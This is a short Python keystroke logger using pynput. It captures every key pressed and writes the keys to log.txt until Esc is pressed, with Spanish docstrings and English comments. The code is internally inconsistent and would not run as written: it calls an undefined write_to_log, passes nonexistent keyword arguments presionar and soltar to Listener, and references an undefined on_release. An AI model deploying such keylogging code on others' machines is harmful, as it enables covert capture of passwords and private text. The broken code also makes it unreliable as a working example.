from pynput.keyboard import Key, Listener

# List to store pressed keys
keys = []

def on_press(key):
    """Registra las pulsaciones"""
    keys.append(key)
    write_to_log(keys)

def escribir_para_registrar(keys):
    """Convierte las pulsaciones en registros del archivo log.txt"""
    with open('log.txt', 'w') as logfile:
        for key in keys:
            key = str(key).replace("'", "")  # Remove quotes from key string
            logfile.write(key)

def soltar(key):
    """Para el Listener cuando 'ESC' es presionado"""
    if key == Key.esc:
        return False

# Start the listener
with Listener(presionar=on_press, soltar=on_release) as listener:
    listener.join()
